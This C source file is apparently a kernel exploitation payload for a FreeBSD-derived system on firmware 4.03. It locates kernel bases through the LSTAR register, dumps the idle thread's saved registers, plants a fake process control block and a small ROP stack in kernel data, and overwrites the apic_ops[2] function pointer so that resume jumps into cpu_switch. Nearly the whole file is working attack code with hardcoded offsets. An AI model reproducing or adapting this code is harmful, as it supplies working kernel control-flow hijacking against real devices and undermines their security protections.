#include <stdint.h>

/*
 * r8_gamble v1 — Point apic_ops[2] at cpu_switch restore sequence
 *
 * THE GAMBLE: During resume, when the LAPIC code calls apic_ops[2],
 * R8 might contain a pointer to a PCB (or something useful).
 * If we jump into the cpu_switch restore sequence that loads
 * registers from [R8+offset], we might get a controlled context.
 *
 * We also prepare a fake PCB in kdata (persistent) just in case
 * R8 happens to point there. But the real gamble is blind.
 *
 * EXPECTED RESULT: Kernel panic. This is exploratory.
 *
 * Target modes (via fw_ver):
 *   0x403: Mode 0 — cpu_switch ENTRY (kdata_base - 0x9d6f80)
 *                   First instruction: movq TD_PCB(%rdi), %r8
 *                   Will crash unless RDI is a valid thread pointer
 *
 *   0x1:   Mode 1 — estimated GPR restore (~0x2C0 into cpu_switch)
 *                   At this point, R8 should be the PCB pointer.
 *                   Loads: r15,r14,r13,r12,rbp,rsp,rbx from [R8]
 *                   Then loads pcb_rip into rax and jumps.
 *
 *   0x2:   Mode 2 — estimated GPR restore (~0x2E0 into cpu_switch)
 *                   Slightly later offset, in case mode 1 is too early
 *
 *   0x3:   Mode 3 — just before gpr2dr (~0x2F6 into cpu_switch)
 *                   Latest reasonable estimate for restore sequence
 *
 * Before arming, we:
 *   1. Dump the idle thread's current PCB (for reference)
 *   2. Write a fake PCB to kdata_base+0x200 (persistent)
 *   3. Report everything to the output buffer
 *
 * Output layout (uint64_t indices):
 *   [0]   magic "R8GM" (0x5238474D) | status(32)
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   mode selected
 *   [4]   target address (what apic_ops[2] is set to)
 *   [5]   original xapic_mode
 *   [6]   cpu_switch address
 *   [7]   offset into cpu_switch
 *
 *   --- idle thread context ---
 *   [8]   pcpu0 address
 *   [9]   idlethread address
 *   [10]  idle_pcb address
 *   [11]  idle pcb_r15
 *   [12]  idle pcb_r14
 *   [13]  idle pcb_r13
 *   [14]  idle pcb_r12
 *   [15]  idle pcb_rbp
 *   [16]  idle pcb_rsp
 *   [17]  idle pcb_rbx
 *   [18]  idle pcb_rip
 *   [19]  idle pcb_cr3
 *   [20]  idle pcb_flags (at +0x100)
 *
 *   --- fake PCB at kdata_base+0x200 ---
 *   [21]  fake pcb address
 *   [22]  fake pcb_r15 (sentinel)
 *   [23]  fake pcb_r14 (sentinel)
 *   [24]  fake pcb_r13 (sentinel)
 *   [25]  fake pcb_r12 (sentinel)
 *   [26]  fake pcb_rbp (sentinel)
 *   [27]  fake pcb_rsp (= idle pcb_rsp, safe)
 *   [28]  fake pcb_rbx (sentinel)
 *   [29]  fake pcb_rip (= original xapic_mode, safe return)
 *
 *   --- apic_ops context ---
 *   [30]  apic_ops[0]
 *   [31]  apic_ops[1]
 *   [32]  apic_ops[2] (before overwrite)
 *   [33]  apic_ops[3]
 *   [34]  apic_ops[2] readback (after overwrite)
 *
 *   --- known ktext offsets ---
 *   [35]  nop_ret
 *   [36]  doreti_iret
 *   [37]  cpu_switch_dr2gpr
 *   [38]  cpu_switch_gpr2dr
 *
 *   [50]  sentinel 0xdeadbeefcafe0088
 */

#define MAGIC_R8GM       0x5238474D  /* "R8GM" */

/* FW 4.03 offsets (relative to kdata_base, negative = ktext) */
#define CPU_SWITCH_OFF       (-0x9d6f80)
#define CPU_SWITCH_DR2GPR    (-0x9d6d93)
#define CPU_SWITCH_GPR2DR    (-0x9d6c7a)
#define NOP_RET_OFF          (-0x9d20ca)
#define DORETI_IRET_OFF      (-0x9cf84c)

#define APIC_OPS_OFF_FROM_KTEXT  0x1934AC8

/* pcpu / thread / PCB offsets (FW 4.03 empirical) */
#define PCPU_ARRAY_OFF   0x64d2280
#define PC_IDLETHREAD    0x08
#define TD_PCB           0x3f8
#define PCB_R15          0x00
#define PCB_R14          0x08
#define PCB_R13          0x10
#define PCB_R12          0x18
#define PCB_RBP          0x20
#define PCB_RSP          0x28
#define PCB_RBX          0x30
#define PCB_RIP          0x38
#define PCB_CR3          0x68
#define PCB_FLAGS        0x100

/* Fake PCB location in kdata (persistent through suspend) */
#define FAKE_PCB_OFF     0x200

/* Sentinel values for fake PCB registers */
#define SENT_R15         0x52313547414D4231ULL  /* "R15GAMB1" */
#define SENT_R14         0x52313447414D4232ULL  /* "R14GAMB2" */
#define SENT_R13         0x52313347414D4233ULL  /* "R13GAMB3" */
#define SENT_R12         0x52313247414D4234ULL  /* "R12GAMB4" */
#define SENT_RBP         0x5242504741424235ULL  /* "RBPGAMB5" */
#define SENT_RBX         0x5242584741424236ULL  /* "RBXGAMB6" */

/* Estimated offsets into cpu_switch for the GPR restore sequence.
 *
 * cpu_switch is 0x306+ bytes long (cpu_switch to gpr2dr).
 * The GPR restore (mov PCB_xxx(%r8), %reg) should be somewhere
 * between the pmap switch and gpr2dr.
 *
 * These are educated guesses based on FreeBSD amd64 swtch.S structure:
 *   - Save phase: ~0x40 bytes
 *   - DR save (dr2gpr): at +0x1ED, ~0x30 bytes
 *   - FPU/pmap: variable, ~0x80 bytes
 *   - Load new PCB: ~0x10 bytes
 *   - GPR restore: ~0x30 bytes
 *   - DR restore (gpr2dr): at +0x306
 *
 * So GPR restore starts around +0x2B0 to +0x2E0.
 */
#define RESTORE_EST_A    0x2C0  /* conservative early estimate */
#define RESTORE_EST_B    0x2E0  /* middle estimate */
#define RESTORE_EST_C    0x2F6  /* late estimate, close to gpr2dr */

#define MIN_KERN_ADDR    0xFFFF800000000000ULL

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t*)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t*)addr = val;
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t mode = args->fw_ver;
    volatile uint64_t* out = (volatile uint64_t*)args;
    volatile uint32_t* out32 = (volatile uint32_t*)args;

    /* Zero output */
    for (int i = 0; i < 280; i++)
        out[i] = 0;

    /* Compute addresses */
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_FROM_KTEXT;
    volatile uint64_t* apic_table = (volatile uint64_t*)apic_ops_addr;

    uint64_t cpu_switch_addr = kdata_base + CPU_SWITCH_OFF;
    uint64_t nop_ret = kdata_base + NOP_RET_OFF;
    uint64_t doreti_iret = kdata_base + DORETI_IRET_OFF;
    uint64_t dr2gpr = kdata_base + CPU_SWITCH_DR2GPR;
    uint64_t gpr2dr = kdata_base + CPU_SWITCH_GPR2DR;

    uint64_t original_xapic = apic_table[2];

    /* Determine target based on mode */
    uint64_t target;
    uint32_t actual_mode;
    uint64_t offset_into_switch;

    if (mode == 0x403) {
        actual_mode = 0;
        target = cpu_switch_addr;
        offset_into_switch = 0;
    } else if (mode == 0x1) {
        actual_mode = 1;
        offset_into_switch = RESTORE_EST_A;
        target = cpu_switch_addr + offset_into_switch;
    } else if (mode == 0x2) {
        actual_mode = 2;
        offset_into_switch = RESTORE_EST_B;
        target = cpu_switch_addr + offset_into_switch;
    } else if (mode == 0x3) {
        actual_mode = 3;
        offset_into_switch = RESTORE_EST_C;
        target = cpu_switch_addr + offset_into_switch;
    } else {
        /* Unknown mode — just report, don't arm */
        out32[0] = MAGIC_R8GM;
        out32[1] = 0xFF;
        out[1] = kdata_base;
        out[50] = 0xdeadbeefcafe0088ULL;
        return 0;
    }

    /* Verify target is in ktext range */
    if (target < ktext_base || target >= kdata_base) {
        out32[0] = MAGIC_R8GM;
        out32[1] = 0xFE;
        out[1] = kdata_base;
        out[2] = ktext_base;
        out[3] = actual_mode;
        out[4] = target;
        out[50] = 0xdeadbeefcafe0088ULL;
        return 0;
    }

    /* --- Read idle thread PCB for reference --- */
    uint64_t pcpu0 = kdata_base + PCPU_ARRAY_OFF;
    uint64_t idlethread = read8(pcpu0 + PC_IDLETHREAD);
    uint64_t idle_pcb = 0;
    uint64_t idle_pcb_rsp = 0;

    if (idlethread >= MIN_KERN_ADDR) {
        idle_pcb = read8(idlethread + TD_PCB);
    }

    /* --- Write fake PCB to kdata (persistent) --- */
    uint64_t fake_pcb_addr = kdata_base + FAKE_PCB_OFF;

    if (idle_pcb >= MIN_KERN_ADDR) {
        idle_pcb_rsp = read8(idle_pcb + PCB_RSP);

        /* Copy idle PCB values for reference, then write fake PCB */
        out[11] = read8(idle_pcb + PCB_R15);
        out[12] = read8(idle_pcb + PCB_R14);
        out[13] = read8(idle_pcb + PCB_R13);
        out[14] = read8(idle_pcb + PCB_R12);
        out[15] = read8(idle_pcb + PCB_RBP);
        out[16] = idle_pcb_rsp;
        out[17] = read8(idle_pcb + PCB_RBX);
        out[18] = read8(idle_pcb + PCB_RIP);
        out[19] = read8(idle_pcb + PCB_CR3);
        out[20] = read8(idle_pcb + PCB_FLAGS);
    }

    /* Write fake PCB to kdata_base+0x200.
     * Use sentinel values for most registers so we can detect
     * if they got loaded. Use safe values for RSP and RIP. */
    write8(fake_pcb_addr + PCB_R15, SENT_R15);
    write8(fake_pcb_addr + PCB_R14, SENT_R14);
    write8(fake_pcb_addr + PCB_R13, SENT_R13);
    write8(fake_pcb_addr + PCB_R12, SENT_R12);
    write8(fake_pcb_addr + PCB_RBP, SENT_RBP);
    write8(fake_pcb_addr + PCB_RSP, idle_pcb_rsp);  /* safe: real stack */
    write8(fake_pcb_addr + PCB_RBX, SENT_RBX);
    write8(fake_pcb_addr + PCB_RIP, original_xapic); /* safe: returns 1 */

    /* Also write the original xapic_mode address at the fake RSP
     * position, so if RSP is pivoted and a `ret` executes,
     * it returns to xapic_mode. Belt and suspenders. */
    if (idle_pcb_rsp >= MIN_KERN_ADDR) {
        /* Don't actually write to the real idle stack — it'll get
         * overwritten by the scheduler anyway. Instead, write a
         * return address into kdata as a "ROP stack" just in case. */
        uint64_t rop_stack_addr = kdata_base + 0x300;
        write8(rop_stack_addr,      original_xapic);  /* ret → xapic_mode */
        write8(rop_stack_addr + 8,  nop_ret);          /* ret → ret */
        write8(rop_stack_addr + 16, nop_ret);          /* ret → ret */
        write8(rop_stack_addr + 24, nop_ret);          /* padding */
    }

    /* --- Write header --- */
    out32[0] = MAGIC_R8GM;
    out32[1] = 0xAAAA;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = actual_mode;
    out[4] = target;
    out[5] = original_xapic;
    out[6] = cpu_switch_addr;
    out[7] = offset_into_switch;

    out[8] = pcpu0;
    out[9] = idlethread;
    out[10] = idle_pcb;

    /* Fake PCB info */
    out[21] = fake_pcb_addr;
    out[22] = SENT_R15;
    out[23] = SENT_R14;
    out[24] = SENT_R13;
    out[25] = SENT_R12;
    out[26] = SENT_RBP;
    out[27] = idle_pcb_rsp;
    out[28] = SENT_RBX;
    out[29] = original_xapic;

    /* apic_ops context */
    out[30] = apic_table[0];
    out[31] = apic_table[1];
    out[32] = apic_table[2];
    out[33] = apic_table[3];

    /* Known ktext offsets */
    out[35] = nop_ret;
    out[36] = doreti_iret;
    out[37] = dr2gpr;
    out[38] = gpr2dr;

    /* --- ARM: overwrite apic_ops[2] --- */
    apic_table[2] = target;
    out[34] = apic_table[2];  /* readback */

    out[50] = 0xdeadbeefcafe0088ULL;

    /* Armed — status success */
    out32[1] = 0x0001;

    return 0;
}
